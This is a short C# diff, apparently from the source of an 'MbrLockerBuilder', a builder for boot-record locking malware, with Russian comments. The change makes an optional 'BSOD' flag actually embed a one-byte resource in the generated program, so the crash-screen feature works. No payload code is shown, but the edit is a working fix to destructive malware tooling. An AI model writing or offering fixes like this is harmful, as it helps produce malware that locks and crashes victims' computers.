@@ -394,9 +394,9 @@ namespace MbrLockerBuilder
                 // Добавляем ресурс "BSOD" (если галочка включена)
                 if (this.chkBSOD.Checked)
                 {
-                    byte[] bsodData = new byte[0];
+                    byte[] bsodData = new byte[1] { 0x01 };
                     // Используем RT_RCDATA (стандартный тип для бинарных данных)
-                    if (!UpdateResource(hUpdate, "RT_RCDATA", "BSOD", 0, bsodData, 0))
+                    if (!UpdateResource(hUpdate, "RT_RCDATA", "BSOD", 0, bsodData, 1))
                     {
                         EndUpdateResource(hUpdate, true);
                         throw new Exception("Не удалось добавить ресурс BSOD!");
